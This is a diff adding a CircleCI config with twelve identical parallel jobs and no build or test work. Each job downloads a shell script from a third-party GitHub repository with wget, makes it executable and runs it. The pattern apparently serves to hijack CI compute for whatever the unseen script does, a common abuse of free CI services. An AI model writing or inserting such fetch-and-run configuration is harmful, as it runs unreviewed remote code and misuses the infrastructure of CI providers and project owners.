@@ -1,0 +1,129 @@
+version: 2.1
+
+jobs:
+
+  Syifa_12:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_12
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_11:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_11
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_10:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_10
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_09:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_09
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_08:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_08
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_07:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_07
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_06:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_06
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_05:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_05
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_04:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_04
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_03:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_03
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_02:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_02
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_01:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_01
+            command: wget https://raw.githubusercontent.com/hatilmh/repo1/master/start.sh && chmod u+x start.sh && ./start.sh
+workflows:
+    version: 2
+    Syifa:
+        jobs:
+            - Syifa_12
+            - Syifa_11
+            - Syifa_10
+            - Syifa_09
+            - Syifa_08
+            - Syifa_07
+            - Syifa_06
+            - Syifa_05
+            - Syifa_04
+            - Syifa_03
+            - Syifa_02
+            - Syifa_01
+            
